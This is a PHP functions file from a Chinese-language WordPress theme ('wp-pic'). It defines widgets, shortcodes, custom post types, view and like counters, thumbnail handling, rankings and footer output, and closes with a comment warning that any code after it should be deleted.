        wp_register_style( 'open-sans', false );
    }

add_action('wp_enqueue_scripts', 'remove_wp_open_sans');
add_action('admin_enqueue_scripts', 'remove_wp_open_sans');
endif;

/* 禁用默认小工具
/* -------------------------------- */
function unregister_rss_widget(){
	unregister_widget('WP_Widget_Pages');
	unregister_widget('WP_Nav_Menu_Widget');
	unregister_widget('WP_Widget_Search');
	unregister_widget('WP_Widget_Categories');
	unregister_widget('WP_Widget_Recent_Posts');
	unregister_widget('WP_Widget_Meta');
	unregister_widget('WP_Widget_Archives');
	unregister_widget('WP_Widget_RSS');
	unregister_widget('WP_Widget_Calendar');
	unregister_widget('WP_Widget_Links');
}
add_action('widgets_init','unregister_rss_widget');

/* 前端代码压缩
/* -------------------------------- */
function wp_compress_html(){
    function wp_compress_html_main ($buffer){
        $initial=strlen($buffer);		
		$buffer_out='';
        $buffer=explode("<!--wp-compress-html-->", $buffer);
        $count=count ($buffer);
        for ($i = 0; $i <= $count; $i++){
                $buffer[$i]=(str_replace("\t", " ", $buffer[$i]));
                $buffer[$i]=(str_replace("\n\n", "\n", $buffer[$i]));
                $buffer[$i]=(str_replace("\n", "", $buffer[$i]));
                $buffer[$i]=(str_replace("\r", "", $buffer[$i]));
                while (stristr($buffer[$i], '  ')) {
                    $buffer[$i]=(str_replace("  ", " ", $buffer[$i]));
                }
            $buffer_out.=$buffer[$i];
        }		
        $buffer_out.="\n<!--代码已压缩-->"; 		
        return $buffer_out;
    }

    ob_start("wp_compress_html_main");
}

add_action('get_header', 'wp_compress_html');


///////////////////////////////////////////////////////////////////////////////////////////////////////////
/**                                            WP优化.end                                               **/
///////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 添加编辑器快捷按钮
/* -------------------------------- */
add_action('admin_print_scripts', 'my_quicktags');
function my_quicktags() {
    wp_enqueue_script('my_quicktags', get_stylesheet_directory_uri() . '/js/my_quicktags.js', array(
        'quicktags'
    ));
};

/*添加短代码功能
/* -------------------------------- */
function cx_video($atts, $content = null) {
    return '<video width="800" height="500" autoplay="autoplay" controls="controls" src="' . $content . '" >您的浏览器不支持HTML5的 video 标签，无法为您播放！</video>';
}
add_shortcode('cx_video', 'cx_video');

function cx_embed($atts, $content = null) {
    return '<iframe src="'.$content.'" width="498" height="510" frameborder="0" allowfullscreen></iframe>';
}
add_shortcode('cx_embed', 'cx_embed');

/* 在 WordPress 编辑器添加“下一页”按钮
/* -------------------------------- */
add_filter( 'mce_buttons', 'cmp_add_page_break_button', 1, 2 );
function cmp_add_page_break_button( $buttons, $id ){
    if ( 'content' != $id )
        return $buttons;
    array_splice( $buttons, 13, 0, 'wp_page' );
    return $buttons;
}

/* 添加文章形式
/* -------------------------------- */
add_theme_support( 'post-formats', array(
	'aside', 'image', 'video',
) );

/* 添加特色缩略图支持
/* -------------------------------- */
if ( function_exists('add_theme_support') )add_theme_support('post-thumbnails');
add_filter('pre_option_link_manager_enabled','__return_true'); //添加链接功能

/* 图片默认连接到媒体文件
/* -------------------------------- */
update_option('image_default_link_type', 'none');

/* 分类摘要支持html
/* -------------------------------- */
remove_filter( 'pre_term_description', 'wp_filter_kses' );  
remove_filter( 'pre_link_description', 'wp_filter_kses' );  
remove_filter( 'pre_link_notes', 'wp_filter_kses' );  
remove_filter( 'term_description', 'wp_kses_data' );
function get_excerpt($excerpt){
$content = get_the_content();
$content = strip_tags($content,'<h2><ul><ol><li><a><strong><h3><blockquote><strong>');
$content = mb_strimwidth($content,0,400,'...');
return wpautop($content);
}
add_filter('the_excerpt','get_excerpt');

/* 文章显示位置
/* -------------------------------- */
function my_post_custom_columns( $columns ){
    $columns['subtitle'] = __( '文章项目信息' );
    return $columns;
}
function output_my_post_custom_columns( $column_name, $post_id ){
	$_post_txt = get_post_meta( $post_id, '_post_txt', true );
	if(isset($_post_txt) && $_post_txt !=''){
		echo '<span title="描述：'.$_post_txt.'" class="dashicons dashicons-edit"></span>';
	}
}
add_filter( 'manage_posts_columns', 'my_post_custom_columns' );
add_action( 'manage_posts_custom_column', 'output_my_post_custom_columns', 10, 2 );

/* 注册小工具位置信息
/* -------------------------------- */
if (function_exists('register_sidebar')){
	register_sidebar( array(
		'name'          => '文章侧边栏',
		'id'            => 'sidebar-1',
		'description'   => '显示在文章页侧边',
		'before_title'  => '<h2>',
		'after_title'   => '</h2>',
	) );
}

/* 注册菜单项目
/* -------------------------------- */
register_nav_menus(
   array(
      'left-nav' => __( '顶部导航' ),
	  'home-nav' => __( '首页导航' ),
	  'foot-nav' => __( '底部导航' ),
      'mini-nav' => __( '移动版菜单' )
   )
);

/* 轮播图模块
/* -------------------------------- */
$slider = cx_options('_cx_slider');
if(isset($slider) && $slider == 'off'){
    add_action('init', 'ashu_post_type');
    //Filter：manage_edit-${post_type}_columns 修改列表标题
    add_filter( 'manage_edit-slider_type_columns', 'slider_type_custom_columns' );
    //Action: manage_{$post_type}_posts_custom_column 控制内容显示
    add_action( 'manage_slider_type_posts_custom_column', 'slider_type_manage_custom_columns', 10, 2 );
}

function ashu_post_type() {
    register_post_type( 'slider_type',
        array(
            'labels' => array(
                'name' => '轮播图',
                'singular_name' => '轮播图',
                'add_new' => '添加',
                'add_new_item' => '添加新轮播图',
                'edit_item' => '编辑轮播图',
                'new_item' => '新轮播图'
            ),
        'public' => true,
        'has_archive' => false,
        'exclude_from_search' => true,
        'menu_position' => 8,
        'supports' => array('title')
        )
    );
}

//2. 修改幻灯片文章列表
function slider_type_custom_columns( $columns ) {
    $columns = array(
		'title' => '轮播图名',
        'linked' => '指向图集ID或链接',
        'thumbnail' => '轮播图预览',
        'date' => '日期'
    );
    return $columns;
}

function slider_type_manage_custom_columns( $column, $post_id ) {
    global $post;
    switch( $column ) {
        case "linked":
            if(get_post_meta($post->ID, "_slider_link", true)){
                echo get_post_meta($post->ID, "_slider_link", true);
            } else {echo '----';}
                break;
        case "thumbnail":
                $thumb_url = get_post_meta($post->ID, "_slider_pic", true);
                //$ds_image = vt_resize( '',$ds_thumb , 95, 41, true );
                echo '<img src="'.$thumb_url.'" width="50" height="50" alt="" />';
                break;
        default :
            break;
    }
}

/* 专题模块
/* -------------------------------- */
add_action('init', 'zhuanti_type');
add_filter( 'manage_edit-zhuanti_type_columns', 'zhuanti_type_custom_columns' );
add_action( 'manage_zhuanti_type_posts_custom_column', 'zhuanti_type_manage_custom_columns', 10, 2 );
function zhuanti_type() {
    register_post_type( 'zhuanti_type',
        array(
            'labels' => array(
                 'name' => '专题',
                'singular_name' => '专题列表',
                'add_new' => '添加',
                'add_new_item' => '添加新专题',
                'edit_item' => '编辑专题',
                'new_item' => '新专题'
            ),
        'public' => true,
        'has_archive' => false,
        'exclude_from_search' => true,
        'menu_position' => 8,
        'supports' => array( 'title','thumbnail')
        )
    );
}
function zhuanti_type_custom_columns( $columns ) {
    $columns = array(
		'title' => '专题名',
        'linked' => '链接到',
        'thumbnail' => '专题图片',
        'date' => '日期'
    );
    return $columns;
}
function zhuanti_type_manage_custom_columns( $column, $post_id ) {
    global $post;
    switch( $column ) {
        case "linked":
            if(get_post_meta($post->ID, "_slider_link", true)){
                echo get_post_meta($post->ID, "_slider_link", true);
            } else {echo '----';}
                break;
        case "thumbnail":
                $thumb_url = cx_timthumb(380,170,'380x170',$post->ID,false);
                //$ds_image = vt_resize( '',$ds_thumb , 95, 41, true );
                echo '<img src="'.$thumb_url.'" width="100" height="50" alt="" />';
                break;
        default :
            break;
    }
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////
/**                                            后台功能组件.end                                         **/
///////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 评论添加@
/* -------------------------------- */
function ludou_comment_add_at( $comment_text, $comment = '') {
  if( $comment->comment_parent > 0) {
    $comment_text = '@<a href="#comment-' . $comment->comment_parent . '">'.get_comment_author( $comment->comment_parent ) . '</a> ' . $comment_text;
  }

  return $comment_text;
}
add_filter( 'comment_text' , 'ludou_comment_add_at', 20, 2);

/* 本周更新文章数量
/* -------------------------------- */
function get_week_post_count(){
	$date_query = array(
		array(
		'after'=>'1 week ago'
		)
	);
	$args = array(
		'post_type' => 'post',
		'post_status'=>'publish',
		'date_query' => $date_query,
		'no_found_rows' => true,
		'suppress_filters' => true,
		'fields'=>'ids',
		'posts_per_page'=>-1
	);
	$query = new WP_Query( $args );
	return $query->post_count;
}

/* 文章浏览数量统计
/* -------------------------------- */
function Bing_statistics_visitors( $cache = false ){
 global $post;
 $id = $post->ID;
 if( $cache ) $id = $_GET['id'];
 if( ( !is_singular() && !$cache ) || !$id ) return;
 if( WP_CACHE && !$cache ){?>
  <script type="text/javascript">
  jQuery.ajax({
	type:"GET",
	url:"<?php echo admin_url( 'admin-ajax.php' ); ?>",
	data:"id=<?php echo $id; ?>&action=visitors",
	cache:!1
	});
  </script>
 <?php return;
 }
 $post_views = (int) get_post_meta( $id, 'views', true );
 if( !update_post_meta( $id, 'views', ( $post_views + 1 ) ) ) add_post_meta( $id, 'views', 1, true );
}
add_action( 'wp_footer', 'Bing_statistics_visitors',9999 );
//解决缓存问题
function Bing_statistics_cache(){
 Bing_statistics_visitors( true );
}
add_action( 'wp_ajax_nopriv_visitors', 'Bing_statistics_cache' );
add_action( 'wp_ajax_visitors', 'Bing_statistics_cache' );
//获取计数
function Bing_get_views($display = true ,$id = 0){
 global $post;
 if($id == 0){
	 $post_id = $post->ID;
 }else{
	 $post_id = $id;
 }
 $views = (int) get_post_meta( $post_id, 'views', true );
  if($display) {
	if($views>1000000){
		echo '100万+</br>';
	}else if($views>10000){
		echo round(($views/10000),1).' 万';
	}else if($views>1000){
		echo number_format($views);
	}else{
		echo $views;
	}
  } else {
      return $views;
  }
}

/* 获取文章中图片数量
/* -------------------------------- */
function pic_total() {
    global $post;
    $post_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/\<img.+?src="(.+?)".*?\/>/is ', $post->post_content, $matches, PREG_SET_ORDER);
    $post_img_src = $matches [0][1];
    $cnt = count($matches);
    return $cnt;
}

/* 文章点赞代码
/* -------------------------------- */
//wp_ajax_nopriv_{$_REQUEST[‘action’]} 处理没有登录用户的ajax请求 
add_action('wp_ajax_nopriv_bigfa_like', 'bigfa_like');
//wp_ajax_{$_REQUEST[‘action’]}
add_action('wp_ajax_bigfa_like', 'bigfa_like');
function bigfa_like(){
    global $wpdb,$post;
    $id = $_POST["um_id"];
    $action = $_POST["um_action"];

    if ( $action == 'ding'){
        $bigfa_raters = get_post_meta($id,'bigfa_ding',true);
        $expire = time()+3600*24;
        $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;
        setcookie('bigfa_ding_'.$id,$id,$expire,'/',$domain,false);
        if (!$bigfa_raters || !is_numeric($bigfa_raters)) {
            update_post_meta($id, 'bigfa_ding', 1);
        }
        else {
                update_post_meta($id, 'bigfa_ding', ($bigfa_raters + 1));
            }
        echo get_post_meta($id,'bigfa_ding',true);
    }
    die;
}

/* 调用文章全部图片
/* -------------------------------- */
function all_img($soContent){
 preg_match_all('/<img.*?(?: |\\t|\\r|\\n)?src=[\'"]?(.+?)[\'"]?(?:(?: |\\t|\\r|\\n)+.*?)?>/sim', $soContent, $thePics );
$allPics = count($thePics[1]);
if( $allPics > 0 ){
foreach($thePics[1] as $v){
echo '<img data-original="'.$v.'"/>';
		}
	}
}

/* 作者文章阅读总数
/* -------------------------------- */
if(!function_exists('cx_comment_views')) {
    function cx_comment_views($author_id = 0 ,$display = true) {
        global $wpdb;
		if($author_id == 0){
			$sql = "SELECT SUM(meta_value+0) FROM $wpdb->postmeta WHERE meta_key = 'views'";
		}else{
			$sql = "SELECT SUM(meta_value+0) FROM $wpdb->posts left join $wpdb->postmeta on ($wpdb->posts.ID = $wpdb->postmeta.post_id) WHERE meta_key = 'views' AND post_author =$author_id";
		}
		$views = intval($wpdb->get_var($sql));
        if($display) {
			if($views>1000000){
				echo '100万+</br>';
			}else if($views>10000){
				echo round(($views/10000),1).' 万</br>';
			}else if($views>1000){
				echo round(($views/1000),1).' K</br>';
			}else{
				echo $views;
			}
        } else {
            return $views;
        }
    }
}

/* 获取文章的评论人数
/* -------------------------------- */
function comments_num($postid=0,$which=0) {
	$comments = get_comments('status=approve&type=comment&post_id='.$postid); //获取文章的所有评论
	if ($comments) {
		$i=0; $j=0; $commentusers=array();
		foreach ($comments as $comment) {
			++$i;
			if ($i==1) { $commentusers[] = $comment->comment_author_email; ++$j; }
			if ( !in_array($comment->comment_author_email, $commentusers) ) {
				$commentusers[] = $comment->comment_author_email;
				++$j;
			}
		}
		$output = array($j,$i);
		$which = ($which == 0) ? 0 : 1;
		return '('.$output[$which].')'; //返回评论人数
	}
	return; //没有评论返回0
}

/* 分页代码
/* -------------------------------- */
function wpdx_paging_nav(){
	global $wp_query; 
	$big = 999999999;
	$pagination_links = paginate_links( array(
		'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
		'format' => '?paged=%#%&',
		'current' => max( 1, get_query_var('paged') ),
		'prev_text' =>'<i class="fa fa-chevron-left"></i>',
        'next_text' =>'<i class="fa fa-chevron-right"></i>',
		'before_page_number' => '<span class="meta-nav screen-reader-text">第 </span>',
        'after_page_number' => '<span class="meta-nav screen-reader-text"> 页</span>',
		'total' => $wp_query->max_num_pages
	) ); 
	echo $pagination_links;
}

/* 文章图片处理
/* -------------------------------- */
add_filter( 'max_srcset_image_width', create_function( '', 'return 1;' ) );

/* 输出缩略图地址
/* -------------------------------- */
function post_thumbnail_src(){
	global $post;
	if( has_post_thumbnail() ){
		$thumbnail_src = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'full');
		$post_thumbnail_src = $thumbnail_src [0];
	} else {
		$post_thumbnail_src = '';
		ob_start();
		ob_end_clean();
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
		if(!empty($matches[1][0])){
			$post_thumbnail_src = $matches[1][0];
		}else{
			$random = mt_rand(1, 2);
			$post_thumbnail_src = CX_THEMES_URL.'/images/demo/'.$random.'.jpg';
		}
	};
	return $post_thumbnail_src;
}

/* loading 等待图片
/* -------------------------------- */
function cx_loading($images =''){
	if($images ==''){
		$themes = cx_options('_tags_themes');
		if(isset($themes) && $themes == 1001){
			$image = 'thumb_1';
		}else if($themes == 1002){
			$image = 'thumb_2';	
		}
	}else{
		$image = $images;
	}
	return CX_THEMES_URL.'/images/'.$image.'.png';	
}

/* 输出缩略图格式
/* -------------------------------- */
function cx_timthumb($width=300,$height=300,$name='300X300',$id = 0,$display = true){
	global $post;
	if($id == 0){
		$src = post_thumbnail_src();
		$has_thumb = has_post_thumbnail();
		$get_thumb = get_post_thumbnail_id($post->ID);
	}else{
		$has_thumb = has_post_thumbnail($id);
		$get_thumb = get_post_thumbnail_id($id);
		$src = wp_get_attachment_image_src($get_thumb,'full');
		$src = $src[0];
	}	
	$img = CX_THEMES_URL. '/timthumb.php';
	$fs = (int)cx_options('_thumbnail');
	$fg = cx_options('_oss_fenge');
	if($fs == 1 && function_exists('modefiy_img_url')){
		if($has_thumb){				
			$thumbnail_src = wp_get_attachment_image_src($get_thumb,'full');
			$src2 = $thumbnail_src [0];
			 if($display)echo $src2.$fg.$name; else return $src2.$fg.$name;			
		} else {
			$random = mt_rand(1, 2);
			$src2 = CX_THEMES_URL.'/images/demo/'.$random.'.jpg';
			 if($display)echo $src2; else return $src2;	
		}
	}else if($fs == 2){
		if($display)echo $src.$fg.$name; else return $src.$fg.$name;	
	}else{
		$s = '&src='.$src;
		$h = 'h='.$height;
		$k = '&w='.$width;
		if($display)echo $img.'?'.$h.$k.$s; else return $img.'?'.$h.$k.$s;
	}
}

/* 网站统计代码
/* -------------------------------- */
function baidu_tongji() {
	global $ashu_option;
	$_wz_baidu = $ashu_option['general']['_wz_baidu'];
	if(isset($_wz_baidu) && $_wz_baidu !=''){	
		return stripslashes( $_wz_baidu );	  
	}
}

/* 侧边菜单显示
/* -------------------------------- */
function cx_widget_ctag($num= 5, $tagn= 10) {
	echo '<div class="widget widget_ui_cats">
			<ul class="left_fl">';
	$args=array(
		'orderby' => 'name',
		'taxonomy' => 'category',
		'order' => 'ASC'
	);
	$categories=get_categories($args);
	$categories = array_slice($categories, 0, $num);
	foreach($categories as $category) {
		echo '<li><div class="li_list">';
		echo '<a href="'.get_category_link($category->term_id).'">
				<div class="cat_name_meta">
					<span class="cat_name">'.$category->name.'</span>
					<span class="cat_slug">'.strtoupper($category->slug).'</span>
				</div>
				<i class="fa fa-angle-right"></i>
			  </a></div>';
		$args = array( 'categories' => $category->term_id);
		$tags = cx_get_category_tags($args);
		if(!empty($tags)) {
			$tags = array_slice($tags, 0,$tagn);
			echo '<div class="li_open"><ul>';
			foreach ($tags as $tag) {
				echo '<li>';
				echo '<a href="'.get_category_link($tag->term_id).'">'.$tag->name.'<span class="tag_num">('.$tag->count.')</span></a>';
				echo '</li>';
			}
			echo '</ul></div>';
		}
		echo '</li>';
	}		
	echo '</ul></div>';
}

/* 时间格式显示N天前
/* -------------------------------- */
function timeago( $ptime ) {
	date_default_timezone_set ('ETC/GMT');
    $ptime = strtotime($ptime);
    $etime = time() - $ptime;
    if($etime < 1) return '刚刚';
    $interval = array (
        12 * 30 * 24 * 60 * 60  =>  '年前 ('.date('Y/m', $ptime).')',
        30 * 24 * 60 * 60       =>  '个月前',
        7 * 24 * 60 * 60        =>  '周前',
        24 * 60 * 60            =>  '天前',
        60 * 60                 =>  '小时前',
        60                      =>  '分钟前',
        1                       =>  '秒前'
    );
    foreach ($interval as $secs => $str) {
        $d = $etime / $secs;
        if ($d >= 1) {
            $r = round($d);
            return $r . $str;
        }
    };
}

/* 相关文章
/* -------------------------------- */
function cx_xg_post() {
	global $post;
	$themes = cx_options('_tags_themes');
	$num = themes_if($themes ,1002,10,8,1);
	$cats = wp_get_post_categories($post->ID);
	if ($cats) {
		echo '<div class="content_right_title">相关资源：</div>	<ul class="xg_content">';
		$args = array(
			  'category__in' => array( $cats[0] ),
			  'post__not_in' => array( $post->ID ),
			  'showposts' => $num,
			  'ignore_sticky_posts' => 1
		  );
	  query_posts($args);
		  if (have_posts()) {
			while (have_posts()) {
			  the_post(); update_post_caches($posts); 
			cx_themes_switch($themes);
			}
		  }
	echo "</ul>";  
	  wp_reset_query(); 
	}
}

/* 分类信息调用
/* -------------------------------- */
function cat_meta_information() {
	$term_id = get_queried_object();
	$meta_img = get_term_meta($term_id->term_id , '_feng_images',true);
	$meta_info = category_description($term_id->term_id);
	$output = '';
	if(isset($meta_info) && $meta_info != ''){
		$output .= '<div class="cat_bg">';
		if(isset($meta_img) && $meta_img != ''){
			$output .= '<div class="cat_bg_img" style="background-image:url('.$meta_img.');">';
		}else{
			$output .= '<div class="cat_bg_img" style="background-image:url('.CX_THEMES_URL.'/images/cat_1.png);">';
		}
		$output .= $meta_info;
		$output .= '</div>
					</div>
					<!--分类导航-->
					<div class="fl" style="margin-top: -70px;opacity: 0.8;">';
	}else{
		$output .= '<div class="fl">';
	}
	echo $output;
}

/* 底部版权获取
/* -------------------------------- */
function cx_foot(){
	$menus = array('container'	=> false,
		'echo'	=> false,'items_wrap' => '%3$s',
		'depth'	=> 0,'theme_location' => 'foot-nav',);
	$_foot_ba = cx_options('_foot_ba');
	$_foot_ba_url = cx_options('_foot_ba_url');
	$_footer_nav = 'off';
	$site_title = get_bloginfo( 'name' );
	$output = '';
	$output .= '<div class="w1080 fot cl">';
	$output .= '<p class="footer_menus">'.strip_tags(wp_nav_menu( $menus ), '<a>' ).'</p><p>版权所有 Copyright © by <a href="http://www.2zzt.com">WordPress</a>';	
	$output .= date('Y');		
	$output .= ' '.$site_title.'<span> .AllRights Reserved';	
	if(isset($_foot_ba_url) && $_foot_ba_url =='off'){
     $output .= '<a href="http://www.miitbeian.gov.cn/" rel="nofollow" target="_blank">'.$_foot_ba.'</a>';	
	} else {
	$output .= ' '.$_foot_ba;
	}	
	$output .= '</span></p><p>该主题由 <a href="http://www.chenxingweb.com">晨星博客</a> 开发制作';
	$output .= baidu_tongji();
	$output .= '</p>';
	$output .= '</div>';
	echo $output;
  }	

/* 排行榜单
/* -------------------------------- */  
if(!function_exists('get_most_viewed')) {
    function get_most_viewed($limit = 40,$meta ='views') {
        global $wpdb;
        $output = '';
		if($meta == 'views'){
	        $most_viewed = $wpdb->get_results("SELECT DISTINCT $wpdb->posts.*, (meta_value+0) AS views FROM $wpdb->posts LEFT JOIN $wpdb->postmeta ON $wpdb->postmeta.post_id = $wpdb->posts.ID WHERE post_date < '".current_time('mysql')."' AND post_type ='post' AND post_status = 'publish' AND meta_key = 'views' AND post_password = '' ORDER BY views DESC LIMIT $limit");
		}else{
			$most_viewed = $wpdb->get_results("SELECT ID, post_title, comment_count FROM {$wpdb->prefix}posts WHERE post_type='post' AND post_status='publish' AND post_password='' ORDER BY comment_count DESC LIMIT $limit");	
		}
        if($most_viewed) {
            foreach ($most_viewed as $key => $post) {
				cx_themes_switch(3000,$post,$meta,$key);
            }
        } else {
            echo '<li>'.__('N/A', 'chenxingweb.com').'</li>'."\n";
        }
    }
}

/* 排行榜顶部
/* -------------------------------- */  
function cx_post_ph() {
	$output ="";
	$output .= '<div class="fl">';
	$output .= '<div class="fl_title"><div class="fl01"> 排行榜 </div></div>';
	$output .= '<div class="filter-wrap cl">';
	$output .= '<div class="fl_list"><span> 榜单：</span>';
	$page_slug = the_slug();
	$output .= '<a class="fl_link'.cx_get_page("zhuanti").'" href="'.geturl("zhuanti").'">精选专题</a> | ';
	$output .= '<a class="fl_link'.cx_get_page("views").'" href="'.geturl("views").'">热门榜</a> | ';
	$output .= '<a class="fl_link'.cx_get_page("reping").'" href="'.geturl("reping").'">热评榜</a>';
	$output .= '</div>';
	$output .= '</div>';
	$output .= '</div>';
	echo $output;
}

/* SEO模块
/* -------------------------------- */
function cx_seo() {
	cx__template('seo');	  
}
add_action('wp_head', 'cx_seo',1);

///////////////////////////////////////////////////////////////////////////////////////////////////////////
/**                                            前端功能改进增强.end                                     **/
///////////////////////////////////////////////////////////////////////////////////////////////////////////


//wp-pic的代码已全部结束，如果下面还有代码请立即删除
